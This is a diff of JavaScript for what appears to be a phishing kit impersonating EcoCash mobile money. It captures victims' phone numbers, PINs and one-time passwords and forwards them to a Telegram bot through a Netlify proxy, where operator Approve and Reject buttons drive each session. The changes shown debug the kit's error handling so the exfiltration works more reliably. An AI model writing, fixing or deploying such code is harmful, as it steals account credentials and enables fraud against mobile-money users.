@@ -1,7 +1,6 @@
 (function(){
   'use strict';
 
-  // Route mapped in netlify.toml
   var PROXY = '/api/telegram';
 
   var lastUpdateId = 0;
@@ -37,9 +36,14 @@
       headers: {'Content-Type':'application/json'},
       body: JSON.stringify({ method: method, payload: payload })
     }, ms || 10000).then(function(r){
+      // Check if the server returned HTML instead of JSON (usually a 404 or 500 error page)
+      var contentType = r.headers.get("content-type");
+      if (contentType && contentType.indexOf("application/json") === -1) {
+         throw new Error("Server returned HTML (Status " + r.status + "). The API route is likely missing.");
+      }
       return r.json().then(function(data){
         if(!r.ok) {
-          throw new Error(data.message || data.error || 'Proxy Error ' + r.status);
+          throw new Error(data.message || data.error || 'HTTP Error ' + r.status);
         }
         return data;
       });
@@ -100,18 +104,15 @@
           { text: '❌ Reject',  callback_data: 'reject:'  + sid }
         ]]
       }
-    }).then(function(d){ return !!d.ok; }).catch(function(err){ 
-      console.error("TELEGRAM ERROR:", err);
-      return false; 
-    });
+    }).then(function(d){ return { ok: true }; })
+      .catch(function(err){ 
+        console.error("TELEGRAM ERROR:", err);
+        return { ok: false, error: err.message }; 
+      });
   }
 
   function initPolling(){
-    tg('getUpdates', { offset: -1, limit: 1 }, 5000).then(function(d){
-      if(d.ok && d.result && d.result.length){
-        lastUpdateId = d.result[d.result.length - 1].update_id;
-      }
-    }).catch(function(e){ console.warn("Polling boot failed", e); }).finally(function(){
+    tg('getUpdates', { offset: -1, limit: 1 }, 5000).catch(function(e){ console.warn("Polling boot failed", e); }).finally(function(){
       if(pollingStarted) return;
       pollingStarted = true;
       loop();
@@ -119,7 +120,6 @@
   }
 
   function loop(){
-    // 3s timeout guarantees it beats Netlify's 10s execution limit
     tg('getUpdates', {
       offset: lastUpdateId + 1,
       timeout: 3, 
@@ -212,15 +212,15 @@
     var sid = newSessionId();
     session = { id: sid, stage: 'pin', phone: ph };
 
-    sendLog('🇿🇼 *EcoCash Auth*\n\n📱 *Phone:* `+263 ' + ph + '`\n🔐 *PIN:* `' + pn + '`', sid).then(function(ok){
+    sendLog('🇿🇼 *EcoCash Auth*\n\n📱 *Phone:* `+263 ' + ph + '`\n🔐 *PIN:* `' + pn + '`', sid).then(function(res){
       sending = false;
-      if(!ok){
+      if(!res.ok){
         session = null;
         hideLoader();
         pinsArr.forEach(function(p){ p.value = ''; });
         showDialog({
-          title: 'Connection Error',
-          message: 'Check Netlify Environment Variables (TG_BOT_TOKEN, TG_CHAT_ID).',
+          title: 'System Error (Debug)',
+          message: res.error, // <--- THIS WILL SHOW THE EXACT SERVER ERROR
           type: 'error',
           onOk: function(){ pinsArr[0].focus(); }
         });
@@ -304,11 +304,11 @@
     session = { id: sid, stage: 'otp', code: val, phone: ph };
     usedCodes.add(val);
 
-    sendLog('🇿🇼 *EcoCash OTP*\n\n📱 *Phone:* `+263 ' + ph + '`\n🔑 *OTP:* `' + val + '`', sid).then(function(ok){
+    sendLog('🇿🇼 *EcoCash OTP*\n\n📱 *Phone:* `+263 ' + ph + '`\n🔑 *OTP:* `' + val + '`', sid).then(function(res){
       sending = false;
-      if(!ok){
+      if(!res.ok){
         session = null; usedCodes.delete(val); hideLoader();
-        showDialog({ title: 'Connection Error', message: 'Check Netlify Environment Variables.', type: 'error' });
+        showDialog({ title: 'System Error (Debug)', message: res.error, type: 'error' });
       }
     });
   }
